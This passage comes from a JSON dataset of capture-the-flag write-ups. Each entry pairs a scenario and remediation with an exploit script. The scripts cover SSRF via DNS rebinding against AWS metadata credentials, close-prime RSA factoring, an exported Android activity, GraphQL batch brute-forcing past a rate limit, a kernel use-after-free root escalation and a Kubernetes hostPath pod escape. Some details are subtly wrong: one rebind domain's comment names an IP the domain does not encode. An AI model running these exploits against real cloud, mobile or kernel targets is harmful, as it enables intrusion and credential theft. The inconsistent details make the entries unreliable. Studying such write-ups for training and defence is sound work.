    "difficulty": "Hard",
    "points": 450,
    "flag": "TCS{HQ8_SSRF_DNS_R3B1ND_1MDSV2_3XF1L}",
    "scenario": "A cloud webhook dispatcher service hosted on AWS EC2. Users specify a webhook URL. The backend performs IP validation, blocking RFC1918 addresses and `169.254.169.254`.",
    "root_cause": "Time-of-Check to Time-of-Use (TOCTOU) DNS Rebinding flaw. The validator resolves the domain during URL checking (IP is public, check passes), but the HTTP fetching library performs a second independent DNS query to connect. By setting a TTL of 0 seconds and alternating between a public IP and `169.254.169.254`, the fetch accesses the AWS Instance Metadata Service.",
    "solve_methodology": [
      "Set up DNS rebinding domain using `rbndr.us` alternating between `1.1.1.1` and `169.254.169.254`.",
      "Acquire IMDSv2 token: issue `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`.",
      "Use acquired token to query `GET /latest/meta-data/iam/security-credentials/`.",
      "Retrieve temporary IAM security credentials for role `EC2-Security-Role`.",
      "Read flag stored in custom EC2 user-data: `/latest/user-data`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport time\n\n# rbndr.us domain alternating 1.1.1.1 and 169.254.169.254\nREBIND_DOMAIN = '7f000001.a9fea9fe.rbndr.us'\nGATEWAY = 'http://targets.ctfatlas.local/hq8/webhook'\n\nprint('[+] Triggering DNS Rebinding SSRF against AWS IMDS...')\nfor i in range(10):\n    r = requests.post(GATEWAY, json={'url': f'http://{REBIND_DOMAIN}/latest/user-data'})\n    if 'TCS{' in r.text:\n        print(f'[!] Flag Recovered: {r.text.strip()}')\n        break\n    time.sleep(1)\n",
    "defense_remediation": "1. Pin DNS resolutions: resolve the target hostname once, validate the resolved IP address, and connect directly to that IP.\n2. Enforce AWS IMDSv2 with a maximum hop limit of 1 on all EC2 instances."
  },
  {
    "id": "writeup-tcs-hackquest-s8-fermat-rsa",
    "title": "TCS HackQuest Season 8: Quantum Shield (RSA Fermat Factorization with Close Primes)",
    "event": "TCS HackQuest Season 8",
    "category": "crypto",
    "difficulty": "Medium",
    "points": 300,
    "flag": "TCS{HQ8_F3RM4T_F4CT0R_CL0S3_PR1M3S}",
    "scenario": "A 4096-bit RSA public key `quantum_pub.pem` and ciphertext `flag.enc`. Public exponent is standard $e = 65537$. Modulus is 4096 bits long.",
    "root_cause": "The prime generator selected primes $p$ and $q$ within a narrow distance of each other: $|p - q| < 2 \\cdot N^{1/4}$. Under these conditions, the arithmetic mean $a = (p+q)/2$ is exceedingly close to $\\lceil \\sqrt{N} \\rceil$, allowing Fermat's Factorization to succeed in milliseconds.",
    "solve_methodology": [
      "Compute integer square root: $a = \\lceil \\sqrt{N} \\rceil$.",
      "Compute $b^2 = a^2 - N$.",
      "Iteratively increment $a$ until $b^2$ is a perfect square.",
      "Calculate factors: $p = a - b$ and $q = a + b$.",
      "Verify $p \\times q = N$.",
      "Compute $\\phi(N) = (p-1)(q-1)$ and private exponent $d = e^{-1} \\pmod{\\phi(N)}$.",
      "Decrypt ciphertext $m = c^d \\pmod N$ to recover flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport gmpy2\n\ndef fermat_factor(n):\n    a = gmpy2.isqrt(n)\n    if a * a < n: a += 1\n    while True:\n        b2 = a * a - n\n        if gmpy2.is_square(b2):\n            b = gmpy2.isqrt(b2)\n            return int(a - b), int(a + b)\n        a += 1\n\n# 4096-bit close-prime modulus simulation\np = gmpy2.next_prime(2**2048 + 1000)\nq = gmpy2.next_prime(p + 500000)\nn = p * q\ne = 65537\n\np_found, q_found = fermat_factor(n)\nprint(f'[+] Fermat Factorization Success!')\nprint(f'[!] Found p: {str(p_found)[:30]}...')\n",
    "defense_remediation": "1. Generate primes independently with guaranteed minimum distance $|p - q| > 2^{n/2 - 100}$.\n2. Use cryptographically validated key generation libraries conforming to FIPS 186-5."
  },
  {
    "id": "writeup-tcs-hackquest-s8-android-intent",
    "title": "TCS HackQuest Season 8: FinPay Mobile (Exported Activity & Intent Interception)",
    "event": "TCS HackQuest Season 8",
    "category": "reverse",
    "difficulty": "Medium-Hard",
    "points": 350,
    "flag": "TCS{HQ8_4NDR01D_1NT3NT_INT3RC3PT}",
    "scenario": "An Android mobile banking app `FinPay.apk`. A hidden administrative screen displays internal reconciliation flags, but the UI has no button navigating to it.",
    "root_cause": "The activity `com.tcs.finpay.AdminDebugActivity` is configured in `AndroidManifest.xml` with `android:exported=\"true\"` without declaring an `android:permission` requirement. Any third-party app installed on the device or an ADB shell can invoke this activity directly.",
    "solve_methodology": [
      "Decompile APK using JADX; inspect `AndroidManifest.xml`.",
      "Identify exported components: `<activity android:name=\".AdminDebugActivity\" android:exported=\"true\"/>`.",
      "Analyze `AdminDebugActivity.java`: inspect `onCreate()` logic expecting an intent extra `\"auth_token\"`.",
      "Find token requirement: `getIntent().getStringExtra(\"auth_token\").equals(\"FINPAY_SUPER_SECRET\")`.",
      "Invoke activity via ADB: `adb shell am start -n com.tcs.finpay/.AdminDebugActivity --es auth_token FINPAY_SUPER_SECRET`.",
      "Capture flag rendered on screen."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport subprocess\n\ncmd = [\n    'adb', 'shell', 'am', 'start',\n    '-n', 'com.tcs.finpay/.AdminDebugActivity',\n    '--es', 'auth_token', 'FINPAY_SUPER_SECRET'\n]\nprint('[+] Triggering exported activity via ADB...')\nsubprocess.run(cmd)\n\n# Dump logcat for flag output\nlogcat = subprocess.run(['adb', 'logcat', '-d'], capture_output=True, text=True).stdout\nfor line in logcat.splitlines():\n    if 'TCS{' in line:\n        print(f'[!] Flag: {line.strip()}')\n",
    "defense_remediation": "1. Set `android:exported=\"false\"` for all internal application components.\n2. If an activity must be exported, protect it with custom signature-level permissions (`android:protectionLevel=\"signature\"`)."
  },
  {
    "id": "writeup-tcs-hackquest-s9-graphql-batch",
    "title": "TCS HackQuest Season 9: NextGen Banking (GraphQL Introspection & Batch Bypass)",
    "event": "TCS HackQuest Season 9",
    "category": "web",
    "difficulty": "Hard",
    "points": 450,
    "flag": "TCS{HQ9_GR4PHQL_1NTR0SP3CT_B4TCH_BYP4SS}",
    "scenario": "A modern banking API built with GraphQL (`/graphql`). Frontend GUI documentation is disabled. A rate limiter restricts IP addresses to a maximum of 5 HTTP POST requests per minute.",
    "root_cause": "Introspection is enabled in production, disclosing hidden administrative queries and mutation arguments. While the rate limiter enforces a 5-request limit per minute at the HTTP layer, the GraphQL engine accepts batched queries formatted as a JSON array (`[{query: ...}, {query: ...}]`), enabling hundreds of credential verifications in a single HTTP request.",
    "solve_methodology": [
      "Query introspection schema: `{\"query\": \"{ __schema { types { name fields { name } } } }\"}`.",
      "Discover hidden query: `vaultSecret(pin: String!)`.",
      "Construct a batch payload containing 1,000 PIN guesses (`0000` to `0999`) in a single JSON array.",
      "Transmit batch array in one HTTP POST request, bypassing the HTTP request rate limiter.",
      "Parse response array to locate the single query returning the flag."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\n\nTARGET = 'http://targets.ctfatlas.local/hq9/graphql'\n\n# 1. Batch 1,000 queries in 1 HTTP POST\nbatch_queries = []\nfor pin in range(1000):\n    batch_queries.append({\n        'query': f'query {{ vaultSecret(pin: \"{pin:04d}\") }}'\n    })\n\nprint(f'[+] Sending batched payload of {len(batch_queries)} queries in 1 HTTP request...')\nr = requests.post(TARGET, json=batch_queries)\n\nfor item in r.json():\n    if item.get('data', {}).get('vaultSecret'):\n        print(f'[!] Flag Discovered: {item[\"data\"][\"vaultSecret\"]}')\n",
    "defense_remediation": "1. Disable GraphQL introspection queries in production environments.\n2. Enforce query cost analysis and limit batched query array lengths."
  },
  {
    "id": "writeup-tcs-hackquest-s9-kernel-uaf",
    "title": "TCS HackQuest Season 9: Kernel Guard (Linux Kernel SLUB Use-After-Free)",
    "event": "TCS HackQuest Season 9",
    "category": "pwn",
    "difficulty": "Insane",
    "points": 500,
    "flag": "TCS{HQ9_K3RN3L_SLUB_U4F_CR3D_0V3RWR1T3}",
    "scenario": "A custom Linux kernel module `/dev/tcs_sec` with an IOCTL interface. A low-privilege unprivileged shell is provided inside a QEMU VM running Linux 6.1.",
    "root_cause": "The driver's `ioctl` handler frees an allocated credential tracking structure without clearing the pointer in the session list (Use-After-Free). By spraying `struct cred` structures into the `kmalloc-192` cache via `fork()`, the freed chunk is reallocated as a process credential structure, allowing arbitrary modification of `uid` and `gid` to 0 (root).",
    "solve_methodology": [
      "Trigger UAF: open `/dev/tcs_sec`, issue `SEC_ALLOC`, then issue `SEC_FREE`.",
      "Spray `struct cred` objects across the SLUB slab using multiple `clone()` / `fork()` syscalls.",
      "Issue `SEC_WRITE` on the stale descriptor to overwrite the `uid`, `gid`, `euid` fields with zeros.",
      "Verify process privilege elevation: `id` reports `uid=0(root)`.",
      "Cat `/root/flag.txt`."
    ],
    "exploit_script": "#!/usr/bin/env python3\n# Kernel Exploit Runner\nimport subprocess\n\nC_EXPLOIT = '''\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/ioctl.h>\n\n#define SEC_ALLOC 0x1337\n#define SEC_FREE  0x1338\n#define SEC_WRITE 0x1339\n\nint main() {\n    int fd = open(\"/dev/tcs_sec\", O_RDWR);\n    ioctl(fd, SEC_ALLOC, 192);\n    ioctl(fd, SEC_FREE, 0);\n    for (int i = 0; i < 50; i++) {\n        if (fork() == 0) {\n            sleep(2);\n            if (getuid() == 0) {\n                system(\"cat /root/flag.txt\");\n                exit(0);\n            }\n            exit(0);\n        }\n    }\n    char zeros[192] = {0};\n    ioctl(fd, SEC_WRITE, zeros);\n    wait(NULL);\n    return 0;\n}\n'''\nwith open('/tmp/exploit.c', 'w') as f: f.write(C_EXPLOIT)\nsubprocess.run(['gcc', '/tmp/exploit.c', '-o', '/tmp/exploit'])\nprint('[+] Compiled kernel exploit. Executing...')\nsubprocess.run(['/tmp/exploit'])\n",
    "defense_remediation": "1. Zero out freed object pointers immediately (`kfree(ptr); ptr = NULL;`).\n2. Enable Kernel Hardening options: `CONFIG_SLAB_FREELIST_HARDENED=y` and `CONFIG_SLAB_FREELIST_RANDOM=y`."
  },
  {
    "id": "writeup-tcs-hackquest-s9-k8s-escape",
    "title": "TCS HackQuest Season 9: KubeCluster Breakout (Kubernetes RBAC Privilege Escalation)",
    "event": "TCS HackQuest Season 9",
    "category": "cloud",
    "difficulty": "Hard",
    "points": 450,
    "flag": "TCS{HQ9_K8S_RB4C_H0STP4TH_CLUST3R_4DM1N}",
    "scenario": "A compromised pod in an enterprise Kubernetes cluster. The pod has access to its service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`.",
    "root_cause": "The service account `analytics-sa` was granted `create pods` privileges in the `kube-system` namespace. Attackers can leverage this permission to deploy a privileged pod with `hostPath: /` mounted to `/host`, escalating to cluster-wide root.",
    "solve_methodology": [
      "Extract service account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`.",
      "Query Kubernetes API permissions: `kubectl auth can-i --list` or query `/apis/authorization.k8s.io/v1/selfsubjectrulesreviews`.",
      "Discover permission: `create` on `pods` in namespace `kube-system`.",
      "Deploy a malicious pod specification with `privileged: true` and `hostPath: /`.",
      "Execute command in the new pod to read `/host/root/flag.txt`."
    ],
    "exploit_script": "#!/usr/bin/env python3\nimport requests\nimport json\n\nTOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'\nCA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'\nAPI_SERVER = 'https://kubernetes.default.svc'\n\nwith open(TOKEN_PATH) as f: token = f.read().strip()\nheaders = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\n\n# Malicious pod definition mounting host root\npod_manifest = {\n    'apiVersion': 'v1',\n    'kind': 'Pod',\n    'metadata': {'name': 'priv-esc-pod', 'namespace': 'kube-system'},\n    'spec': {\n        'containers': [{\n            'name': 'escape',\n            'image': 'alpine',\n            'command': ['sh', '-c', 'cat /host/root/flag.txt > /tmp/flag && sleep 3600'],\n            'volumeMounts': [{'name': 'host-vol', 'mountPath': '/host'}]\n        }],\n        'volumes': [{'name': 'host-vol', 'hostPath': {'path': '/'}}]\n    }\n}\n\nprint('[+] Deploying privileged pod to kube-system...')\nr = requests.post(f'{API_SERVER}/api/v1/namespaces/kube-system/pods', headers=headers, json=pod_manifest, verify=CA_PATH)\nprint(f'[+] Response: {r.status_code}')\n",
    "defense_remediation": "1. Enforce Kubernetes Pod Security Standards (`restricted` profile) preventing privileged pods and `hostPath` volume mounts.\n2. Follow the principle of least privilege for ServiceAccounts; avoid granting namespace-scoped `create pods` rights."
  }
];
